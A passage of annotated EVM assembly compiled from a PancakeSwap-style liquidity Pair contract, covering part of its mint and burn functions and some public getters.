*/\n      dup4\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":5206:5229  balance0.sub(_reserve0) */\n      dup8\n      and\n      0xffffffff\n        /* \"src/Pair.sol\":5206:5218  balance0.sub */\n      tag_170\n        /* \"src/Pair.sol\":5206:5229  balance0.sub(_reserve0) */\n      and\n      jump\t// in\n    tag_201:\n        /* \"src/Pair.sol\":5191:5229  uint amount0 = balance0.sub(_reserve0) */\n      swap1\n      pop\n        /* \"src/Pair.sol\":5239:5251  uint amount1 */\n      0x00\n        /* \"src/Pair.sol\":5254:5277  balance1.sub(_reserve1) */\n      tag_202\n        /* \"src/Pair.sol\":5254:5262  balance1 */\n      dup4\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":5254:5277  balance1.sub(_reserve1) */\n      dup8\n      and\n      0xffffffff\n        /* \"src/Pair.sol\":5254:5266  balance1.sub */\n      tag_170\n        /* \"src/Pair.sol\":5254:5277  balance1.sub(_reserve1) */\n      and\n      jump\t// in\n    tag_202:\n        /* \"src/Pair.sol\":5239:5277  uint amount1 = balance1.sub(_reserve1) */\n      swap1\n      pop\n        /* \"src/Pair.sol\":5288:5298  bool feeOn */\n      0x00\n        /* \"src/Pair.sol\":5301:5331  _mintFee(_reserve0, _reserve1) */\n      tag_203\n        /* \"src/Pair.sol\":5310:5319  _reserve0 */\n      dup8\n        /* \"src/Pair.sol\":5321:5330  _reserve1 */\n      dup8\n        /* \"src/Pair.sol\":5301:5309  _mintFee */\n      tag_204\n        /* \"src/Pair.sol\":5301:5331  _mintFee(_reserve0, _reserve1) */\n      jump\t// in\n    tag_203:\n        /* \"src/Pair.sol\":5341:5358  uint _totalSupply */\n      0x00\n        /* \"src/Pair.sol\":5361:5372  totalSupply */\n      sload\n        /* \"src/Pair.sol\":5288:5331  bool feeOn = _mintFee(_reserve0, _reserve1) */\n      swap1\n      swap2\n      pop\n        /* \"src/Pair.sol\":5464:5481  _totalSupply == 0 */\n      dup1\n        /* \"src/Pair.sol\":5460:5854  if (_totalSupply == 0) {... */\n      tag_205\n      jumpi\n        /* \"src/Pair.sol\":5509:5563  Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n      tag_206\n        /* \"src/Pair.sol\":443:450  10 ** 3 */\n      0x03e8\n        /* \"src/Pair.sol\":5509:5540  Math.sqrt(amount0.mul(amount1)) */\n      tag_169\n        /* \"src/Pair.sol\":5519:5539  amount0.mul(amount1) */\n      tag_208\n        /* \"src/Pair.sol\":5519:5526  amount0 */\n      dup8\n        /* \"src/Pair.sol\":5531:5538  amount1 */\n      dup8\n        /* \"src/Pair.sol\":5519:5539  amount0.mul(amount1) */\n      0xffffffff\n        /* \"src/Pair.sol\":5519:5530  amount0.mul */\n      tag_168\n        /* \"src/Pair.sol\":5519:5539  amount0.mul(amount1) */\n      and\n      jump\t// in\n    tag_208:\n        /* \"src/Pair.sol\":5509:5518  Math.sqrt */\n      tag_209\n        /* \"src/Pair.sol\":5509:5540  Math.sqrt(amount0.mul(amount1)) */\n      jump\t// in\n        /* \"src/Pair.sol\":5509:5563  Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n    tag_206:\n        /* \"src/Pair.sol\":5497:5563  liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n      swap9\n      pop\n        /* \"src/Pair.sol\":5577:5613  _mint(address(0), MINIMUM_LIQUIDITY) */\n      tag_210\n        /* \"src/Pair.sol\":5591:5592  0 */\n      0x00\n        /* \"src/Pair.sol\":443:450  10 ** 3 */\n      0x03e8\n        /* \"src/Pair.sol\":5577:5582  _mint */\n      tag_211\n        /* \"src/Pair.sol\":5577:5613  _mint(address(0), MINIMUM_LIQUIDITY) */\n      jump\t// in\n    tag_210:\n        /* \"src/Pair.sol\":5460:5854  if (_totalSupply == 0) {... */\n      jump(tag_212)\n    tag_205:\n        /* \"src/Pair.sol\":5711:5843  Math.min(... */\n      tag_213\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":5737:5774  amount0.mul(_totalSupply) / _reserve0 */\n      dup10\n      and\n        /* \"src/Pair.sol\":5737:5762  amount0.mul(_totalSupply) */\n      tag_214\n        /* \"src/Pair.sol\":5737:5744  amount0 */\n      dup7\n        /* \"src/Pair.sol\":5749:5761  _totalSupply */\n      dup5\n        /* \"src/Pair.sol\":5737:5762  amount0.mul(_totalSupply) */\n      0xffffffff\n        /* \"src/Pair.sol\":5737:5748  amount0.mul */\n      tag_168\n        /* \"src/Pair.sol\":5737:5762  amount0.mul(_totalSupply) */\n      and\n      jump\t// in\n    tag_214:\n        /* \"src/Pair.sol\":5737:5774  amount0.mul(_totalSupply) / _reserve0 */\n      dup2\n      tag_215\n      jumpi\n      invalid\n    tag_215:\n      div\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":5792:5829  amount1.mul(_totalSupply) / _reserve1 */\n      dup10\n      and\n        /* \"src/Pair.sol\":5792:5817  amount1.mul(_totalSupply) */\n      tag_216\n        /* \"src/Pair.sol\":5792:5799  amount1 */\n      dup7\n        /* \"src/Pair.sol\":5804:5816  _totalSupply */\n      dup6\n        /* \"src/Pair.sol\":5792:5817  amount1.mul(_totalSupply) */\n      0xffffffff\n        /* \"src/Pair.sol\":5792:5803  amount1.mul */\n      tag_168\n        /* \"src/Pair.sol\":5792:5817  amount1.mul(_totalSupply) */\n      and\n      jump\t// in\n    tag_216:\n        /* \"src/Pair.sol\":5792:5829  amount1.mul(_totalSupply) / _reserve1 */\n      dup2\n      tag_217\n      jumpi\n      invalid\n    tag_217:\n      div\n        /* \"src/Pair.sol\":5711:5719  Math.min */\n      tag_218\n        /* \"src/Pair.sol\":5711:5843  Math.min(... */\n      jump\t// in\n    tag_213:\n        /* \"src/Pair.sol\":5699:5843  liquidity = Math.min(... */\n      swap9\n      pop\n        /* \"src/Pair.sol\":5460:5854  if (_totalSupply == 0) {... */\n    tag_212:\n        /* \"src/Pair.sol\":5883:5884  0 */\n      0x00\n        /* \"src/Pair.sol\":5871:5880  liquidity */\n      dup10\n        /* \"src/Pair.sol\":5871:5884  liquidity > 0 */\n      gt\n        /* \"src/Pair.sol\":5863:5927  require(liquidity > 0, \"Pancake: INSUFFICIENT_LIQUIDITY_MINTED\") */\n      tag_219\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x26\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_ef633320352a650c1d75752f13e6c73d8d8f7f26a5596a6d026c1bf50d2f7713\n      0x26\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_219:\n        /* \"src/Pair.sol\":5937:5957  _mint(to, liquidity) */\n      tag_220\n        /* \"src/Pair.sol\":5943:5945  to */\n      dup11\n        /* \"src/Pair.sol\":5947:5956  liquidity */\n      dup11\n        /* \"src/Pair.sol\":5937:5942  _mint */\n      tag_211\n        /* \"src/Pair.sol\":5937:5957  _mint(to, liquidity) */\n      jump\t// in\n    tag_220:\n        /* \"src/Pair.sol\":5968:6017  _update(balance0, balance1, _reserve0, _reserve1) */\n      tag_221\n        /* \"src/Pair.sol\":5976:5984  balance0 */\n      dup7\n        /* \"src/Pair.sol\":5986:5994  balance1 */\n      dup7\n        /* \"src/Pair.sol\":5996:6005  _reserve0 */\n      dup11\n        /* \"src/Pair.sol\":6007:6016  _reserve1 */\n      dup11\n        /* \"src/Pair.sol\":5968:5975  _update */\n      tag_179\n        /* \"src/Pair.sol\":5968:6017  _update(balance0, balance1, _reserve0, _reserve1) */\n      jump\t// in\n    tag_221:\n        /* \"src/Pair.sol\":6031:6036  feeOn */\n      dup2\n        /* \"src/Pair.sol\":6027:6074  if (feeOn) kLast = uint(reserve0).mul(reserve1) */\n      iszero\n      tag_222\n      jumpi\n        /* \"src/Pair.sol\":6065:6073  reserve1 */\n      sload(0x0b)\n        /* \"src/Pair.sol\":6046:6074  uint(reserve0).mul(reserve1) */\n      tag_223\n      swap1\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":6051:6059  reserve0 */\n      dup1\n      dup3\n      and\n      swap2\n      shl(0x70, 0x01)\n        /* \"src/Pair.sol\":6065:6073  reserve1 */\n      swap1\n      div\n      and\n        /* \"src/Pair.sol\":6046:6074  uint(reserve0).mul(reserve1) */\n      0xffffffff\n        /* \"src/Pair.sol\":6046:6064  uint(reserve0).mul */\n      tag_168\n        /* \"src/Pair.sol\":6046:6074  uint(reserve0).mul(reserve1) */\n      and\n      jump\t// in\n    tag_223:\n        /* \"src/Pair.sol\":6038:6043  kLast */\n      0x0e\n        /* \"src/Pair.sol\":6038:6074  kLast = uint(reserve0).mul(reserve1) */\n      sstore\n        /* \"src/Pair.sol\":6027:6074  if (feeOn) kLast = uint(reserve0).mul(reserve1) */\n    tag_222:\n        /* \"src/Pair.sol\":6129:6163  Mint(msg.sender, amount0, amount1) */\n      0x40\n      dup1\n      mload\n      dup6\n      dup2\n      mstore\n      0x20\n      dup2\n      add\n      dup6\n      swap1\n      mstore\n      dup2\n      mload\n        /* \"src/Pair.sol\":6134:6144  msg.sender */\n      caller\n      swap3\n        /* \"src/Pair.sol\":6129:6163  Mint(msg.sender, amount0, amount1) */\n      0x4c209b5fc8ad50758f13e2e1088ba56a560dff690a1c6fef26394f4c03821c4f\n      swap3\n      dup3\n      swap1\n      sub\n      add\n      swap1\n      log2\n      pop\n      pop\n        /* \"src/Pair.sol\":1266:1267  1 */\n      0x01\n        /* \"src/Pair.sol\":1255:1263  unlocked */\n      0x0f\n        /* \"src/Pair.sol\":1255:1267  unlocked = 1 */\n      sstore\n      pop\n        /* \"src/Pair.sol\":4905:6170  function mint(address to) external lock returns (uint liquidity) {... */\n      swap5\n      swap7\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/ERC20.sol\":339:383  mapping(address => uint256) public balanceOf */\n    tag_86:\n      mstore(0x20, 0x01)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"src/Pair.sol\":1010:1027  uint public kLast */\n    tag_88:\n      sload(0x0e)\n      dup2\n      jump\t// out\n        /* \"src/ERC20.sol\":778:819  mapping(address => uint256) public nonces */\n    tag_91:\n      mstore(0x20, 0x05)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"src/Pair.sol\":7669:9098  function burn(... */\n    tag_94:\n        /* \"src/Pair.sol\":7732:7744  uint amount0 */\n      0x00\n        /* \"src/Pair.sol\":7746:7758  uint amount1 */\n      dup1\n        /* \"src/Pair.sol\":1179:1187  unlocked */\n      sload(0x0f)\n        /* \"src/Pair.sol\":1191:1192  1 */\n      0x01\n        /* \"src/Pair.sol\":1179:1192  unlocked == 1 */\n      eq\n        /* \"src/Pair.sol\":1171:1212  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_225\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_225:\n        /* \"src/Pair.sol\":1233:1234  0 */\n      0x00\n        /* \"src/Pair.sol\":1222:1230  unlocked */\n      0x0f\n        /* \"src/Pair.sol\":1222:1234  unlocked = 0 */\n      dup2\n      swap1\n      sstore\n        /* \"src/Pair.sol\":1233:1234  0 */\n      dup1\n        /* \"src/Pair.sol\":7813:7826  getReserves() */\n      tag_227\n        /* \"src/Pair.sol\":7813:7824  getReserves */\n      tag_54\n        /* \"src/Pair.sol\":7813:7826  getReserves() */\n      jump\t// in\n    tag_227:\n      pop\n        /* \"src/Pair.sol\":7869:7875  token0 */\n      sload(0x08)\n        /* \"src/Pair.sol\":7918:7924  token1 */\n      sload(0x09)\n        /* \"src/Pair.sol\":7965:8005  IERC20(_token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/Pair.sol\":7999:8003  this */\n      address\n        /* \"src/Pair.sol\":7965:8005  IERC20(_token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/Pair.sol\":7770:7826  (uint112 _reserve0, uint112 _reserve1, ) = getReserves() */\n      swap5\n      swap7\n      pop\n      swap3\n      swap5\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":7869:7875  token0 */\n      swap2\n      dup3\n      and\n      swap4\n        /* \"src/Pair.sol\":7918:7924  token1 */\n      swap2\n      and\n      swap2\n        /* \"src/Pair.sol\":7851:7866  address _token0 */\n      0x00\n      swap2\n        /* \"src/Pair.sol\":7869:7875  token0 */\n      dup5\n      swap2\n        /* \"src/Pair.sol\":7965:7990  IERC20(_token0).balanceOf */\n      0x70a08231\n      swap2\n        /* \"src/Pair.sol\":7965:8005  IERC20(_token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/Pair.sol\":7869:7875  token0 */\n      dup7\n        /* \"src/Pair.sol\":7965:8005  IERC20(_token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_228\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_228:\n        /* \"src/Pair.sol\":7965:8005  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_229\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_229:\n        /* \"src/Pair.sol\":7965:8005  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_230\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_230:\n      pop\n        /* \"src/Pair.sol\":7965:8005  IERC20(_token0).balanceOf(address(this)) */\n      mload\n        /* \"src/Pair.sol\":8031:8071  IERC20(_token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/Pair.sol\":8065:8069  this */\n      address\n        /* \"src/Pair.sol\":8031:8071  IERC20(_token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/Pair.sol\":7965:8005  IERC20(_token0).balanceOf(address(this)) */\n      swap2\n      swap3\n      pop\n        /* \"src/Pair.sol\":8015:8028  uint balance1 */\n      0x00\n      swap2\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":8031:8056  IERC20(_token1).balanceOf */\n      dup6\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"src/Pair.sol\":8031:8071  IERC20(_token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n        /* \"src/Pair.sol\":7965:8005  IERC20(_token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"src/Pair.sol\":8031:8071  IERC20(_token1).balanceOf(address(this)) */\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/Pair.sol\":8031:8056  IERC20(_token1).balanceOf */\n      dup7\n        /* \"src/Pair.sol\":8031:8071  IERC20(_token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_231\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_231:\n        /* \"src/Pair.sol\":8031:8071  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_232\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_232:\n        /* \"src/Pair.sol\":8031:8071  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_233\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_233:\n      pop\n        /* \"src/Pair.sol\":8031:8071  IERC20(_token1).balanceOf(address(this)) */\n      mload\n        /* \"src/Pair.sol\":8116:8120  this */\n      address\n        /* \"src/Pair.sol\":8081:8095  uint liquidity */\n      0x00\n        /* \"src/Pair.sol\":8098:8122  balanceOf[address(this)] */\n      swap1\n      dup2\n      mstore\n        /* \"src/Pair.sol\":8098:8107  balanceOf */\n      0x01\n        /* \"src/Pair.sol\":8031:8071  IERC20(_token1).balanceOf(address(this)) */\n      0x20\n        /* \"src/Pair.sol\":8098:8122  balanceOf[address(this)] */\n      mstore\n      0x40\n      dup2\n      keccak256\n      sload\n        /* \"src/Pair.sol\":8031:8071  IERC20(_token1).balanceOf(address(this)) */\n      swap2\n      swap3\n      pop\n        /* \"src/Pair.sol\":8146:8176  _mintFee(_reserve0, _reserve1) */\n      tag_234\n        /* \"src/Pair.sol\":8155:8164  _reserve0 */\n      dup9\n        /* \"src/Pair.sol\":8166:8175  _reserve1 */\n      dup9\n        /* \"src/Pair.sol\":8146:8154  _mintFee */\n      tag_204\n        /* \"src/Pair.sol\":8146:8176  _mintFee(_reserve0, _reserve1) */\n      jump\t// in\n    tag_234:\n        /* \"src/Pair.sol\":8186:8203  uint _totalSupply */\n      0x00\n        /* \"src/Pair.sol\":8206:8217  totalSupply */\n      sload\n        /* \"src/Pair.sol\":8133:8176  bool feeOn = _mintFee(_reserve0, _reserve1) */\n      swap1\n      swap2\n      pop\n        /* \"src/Pair.sol\":8206:8217  totalSupply */\n      dup1\n        /* \"src/Pair.sol\":8315:8338  liquidity.mul(balance0) */\n      tag_235\n        /* \"src/Pair.sol\":8315:8324  liquidity */\n      dup5\n        /* \"src/Pair.sol\":8329:8337  balance0 */\n      dup8\n        /* \"src/Pair.sol\":8315:8338  liquidity.mul(balance0) */\n      0xffffffff\n        /* \"src/Pair.sol\":8315:8328  liquidity.mul */\n      tag_168\n        /* \"src/Pair.sol\":8315:8338  liquidity.mul(balance0) */\n      and\n      jump\t// in\n    tag_235:\n        /* \"src/Pair.sol\":8315:8353  liquidity.mul(balance0) / _totalSupply */\n      dup2\n      tag_236\n      jumpi\n      invalid\n    tag_236:\n      div\n      swap11\n      pop\n        /* \"src/Pair.sol\":8447:8459  _totalSupply */\n      dup1\n        /* \"src/Pair.sol\":8421:8444  liquidity.mul(balance1) */\n      tag_237\n        /* \"src/Pair.sol\":8421:8430  liquidity */\n      dup5\n        /* \"src/Pair.sol\":8435:8443  balance1 */\n      dup7\n        /* \"src/Pair.sol\":8421:8444  liquidity.mul(balance1) */\n      0xffffffff\n        /* \"src/Pair.sol\":8421:8434  liquidity.mul */\n      tag_168\n        /* \"src/Pair.sol\":8421:8444  liquidity.mul(balance1) */\n      and\n      jump\t// in\n    tag_237:\n        /* \"src/Pair.sol\":8421:8459  liquidity.mul(balance1) / _totalSupply */\n      dup2\n      tag_238\n      jumpi\n      invalid\n    tag_238:\n      div\n        /* \"src/Pair.sol\":8411:8459  amount1 = liquidity.mul(balance1) / _totalSupply */\n      swap10\n      pop\n        /* \"src/Pair.sol\":8548:8549  0 */\n      0x00\n        /* \"src/Pair.sol\":8538:8545  amount0 */\n      dup12\n        /* \"src/Pair.sol\":8538:8549  amount0 > 0 */\n      gt\n        /* \"src/Pair.sol\":8538:8564  amount0 > 0 && amount1 > 0 */\n      dup1\n      iszero\n      tag_239\n      jumpi\n      pop\n        /* \"src/Pair.sol\":8563:8564  0 */\n      0x00\n        /* \"src/Pair.sol\":8553:8560  amount1 */\n      dup11\n        /* \"src/Pair.sol\":8553:8564  amount1 > 0 */\n      gt\n        /* \"src/Pair.sol\":8538:8564  amount0 > 0 && amount1 > 0 */\n    tag_239:\n        /* \"src/Pair.sol\":8517:8628  require(... */\n      tag_240\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x26\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_6c050b0a8d3f2d18d11271ee0a551b7748437b8fa9a6165c561190d34a2947d6\n      0x26\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_240:\n        /* \"src/Pair.sol\":8638:8669  _burn(address(this), liquidity) */\n      tag_241\n        /* \"src/Pair.sol\":8652:8656  this */\n      address\n        /* \"src/Pair.sol\":8659:8668  liquidity */\n      dup5\n        /* \"src/Pair.sol\":8638:8643  _burn */\n      tag_242\n        /* \"src/Pair.sol\":8638:8669  _burn(address(this), liquidity) */\n      jump\t// in\n    tag_241:\n        /* \"src/Pair.sol\":8679:8714  _safeTransfer(_token0, to, amount0) */\n      tag_243\n        /* \"src/Pair.sol\":8693:8700  _token0 */\n      dup8\n        /* \"src/Pair.sol\":8702:8704  to */\n      dup14\n        /* \"src/Pair.sol\":8706:8713  amount0 */\n      dup14\n        /* \"src/Pair.sol\":8679:8692  _safeTransfer */\n      tag_142\n        /* \"src/Pair.sol\":8679:8714  _safeTransfer(_token0, to, amount0) */\n      jump\t// in\n    tag_243:\n        /* \"src/Pair.sol\":8724:8759  _safeTransfer(_token1, to, amount1) */\n      tag_244\n        /* \"src/Pair.sol\":8738:8745  _token1 */\n      dup7\n        /* \"src/Pair.sol\":8747:8749  to */\n      dup14\n        /* \"src/Pair.sol\":8751:8758  amount1 */\n      dup13\n        /* \"src/Pair.sol\":8724:8737  _safeTransfer */\n      tag_142\n        /* \"src/Pair.sol\":8724:8759  _safeTransfer(_token1, to, amount1) */\n      jump\t// in\n    tag_244:\n        /* \"src/Pair.sol\":8780:8820  IERC20(_token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/Pair.sol\":8814:8818  this */\n      address\n        /* \"src/Pair.sol\":8780:8820  IERC20(_token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":8780:8805  IERC20(_token0).balanceOf */\n      dup10\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"src/Pair.sol\":8780:8820  IERC20(_token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/Pair.sol\":8780:8805  IERC20(_token0).balanceOf */\n      dup7\n        /* \"src/Pair.sol\":8780:8820  IERC20(_token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_245\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_245:\n        /* \"src/Pair.sol\":8780:8820  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_246\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_246:\n        /* \"src/Pair.sol\":8780:8820  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_247\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_247:\n      pop\n        /* \"src/Pair.sol\":8780:8820  IERC20(_token0).balanceOf(address(this)) */\n      mload\n        /* \"src/Pair.sol\":8841:8881  IERC20(_token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/Pair.sol\":8875:8879  this */\n      address\n        /* \"src/Pair.sol\":8841:8881  IERC20(_token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/Pair.sol\":8780:8820  IERC20(_token0).balanceOf(address(this)) */\n      swap2\n      swap7\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":8841:8866  IERC20(_token1).balanceOf */\n      dup9\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"src/Pair.sol\":8841:8881  IERC20(_token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n        /* \"src/Pair.sol\":8780:8820  IERC20(_token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"src/Pair.sol\":8841:8881  IERC20(_token1).balanceOf(address(this)) */\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/Pair.sol\":8841:8866  IERC20(_token1).balanceOf */\n      dup7\n        /* \"src/Pair.sol\":8841:8881  IERC20(_token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_248\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_248:\n        /* \"src/Pair.sol\":8841:8881  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_249\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    